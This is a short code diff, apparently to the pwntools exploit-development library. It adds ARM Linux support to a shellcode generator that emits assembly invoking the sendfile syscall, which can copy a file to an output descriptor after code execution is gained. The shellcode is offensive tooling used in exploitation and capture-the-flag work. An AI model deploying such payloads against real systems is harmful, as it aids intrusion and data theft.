@@ -1,7 +1,7 @@
 from pwn.internal.shellcode_helper import *
 from ..misc.pushstr import pushstr
 
-@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'])
+@shellcode_reqs(arch=['i386', 'amd64', 'arm'], os=['linux', 'freebsd'])
 def sendfile(in_fd = 0, out_fd = 1, arch = None, os = None):
     """Args: [in_fd (imm/reg) = STDIN_FILENO, [out_fd (imm/reg) = STDOUT_FILENO]
 
@@ -22,7 +22,24 @@ def sendfile(in_fd = 0, out_fd = 1, arch = None, os = None):
         elif os == 'freebsd':
             return _sendfile_freebsd_amd64(in_fd, out_fd)
 
+    elif arch == 'arm':
+        if os == 'linux':
+            return _sendfile_linux_arm(in_fd, out_fd)
+
     no_support('sendfile', os, arch)
+
+def _sendfile_linux_arm(in_fd, out_fd):
+    out = []
+
+    out += ['mov r0, #%s' % (str(out_fd)),
+            'mov r1, #%s' % (str(in_fd)),
+            'mov r2, #0',
+            'mov r3, #255',
+            'svc SYS_sendfile',
+            '.align 2']
+
+    return indent_shellcode(out)
+
 
 def _sendfile_linux_i386(in_fd, out_fd):
     return """
